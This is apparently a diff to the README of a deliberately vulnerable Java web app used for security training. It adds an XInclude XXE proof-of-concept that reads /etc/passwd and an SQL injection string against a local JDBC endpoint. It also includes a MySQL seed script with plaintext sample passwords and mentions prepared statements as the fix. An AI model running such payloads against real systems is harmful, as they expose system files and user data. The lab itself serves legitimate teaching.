@@ -104,3 +104,83 @@ if __name__ == '__main__':
 
 访问`http://localhost:8080/file/`进行文件上传，上传成功后，再访问`http://localhost:8080/image/上传的文件名`可访问上传后的文件。
 
+## XXE
+
+2018年08月22日更新支持XInclude的XXE漏洞代码，详情见代码。
+
+POC
+
+```xml
+<?xml version="1.0" ?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+ <xi:include href="file:///etc/passwd" parse="text"/>
+</root>
+```
+
+URL编码后
+
+``` 
+http://localhost:8080/xxe/DocumentBuilder_xinclude?xml=%3C%3fxml+version%3d%221.0%22+%3f%3E%0d%0a%3Croot+xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3E%0d%0a+%3Cxi%3ainclude+href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22+parse%3d%22text%22%2f%3E%0d%0a%3C%2froot%3E
+```
+
+## SQL注入
+
+POC
+
+``` 
+http://localhost:8080/sqli/jdbc?name=joychou' or 'a'='a
+```
+
+返回`joychou: 123 wilson: 456 lightless: 789`
+
+正常访问`http://localhost:8080/sqli/jdbc?name=joychou`，返回`joychou: 123`
+
+数据库配置：
+
+```sql
+/*
+ Navicat Premium Data Transfer
+
+ Source Server         : localhost
+ Source Server Type    : MySQL
+ Source Server Version : 80012
+ Source Host           : localhost:3306
+ Source Schema         : sectest
+
+ Target Server Type    : MySQL
+ Target Server Version : 80012
+ File Encoding         : 65001
+
+ Date: 22/08/2018 21:09:57
+*/
+
+SET NAMES utf8mb4;
+SET FOREIGN_KEY_CHECKS = 0;
+
+-- ----------------------------
+-- Table structure for users
+-- ----------------------------
+DROP TABLE IF EXISTS `users`;
+CREATE TABLE `users` (
+  `name` varchar(255) NOT NULL,
+  `password` varchar(255) NOT NULL,
+  `isAdmin` varchar(255) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
+
+-- ----------------------------
+-- Records of users
+-- ----------------------------
+BEGIN;
+INSERT INTO `users` VALUES ('joychou', '123', '1');
+INSERT INTO `users` VALUES ('wilson', '456', '0');
+INSERT INTO `users` VALUES ('lightless', '789', '0');
+COMMIT;
+
+SET FOREIGN_KEY_CHECKS = 1;
+
+```
+
+说明：
+
+SQL注入修复方式采用预处理方式，修复见代码。
+Mybatis的`#{}`也是预处理方式处理SQL注入。
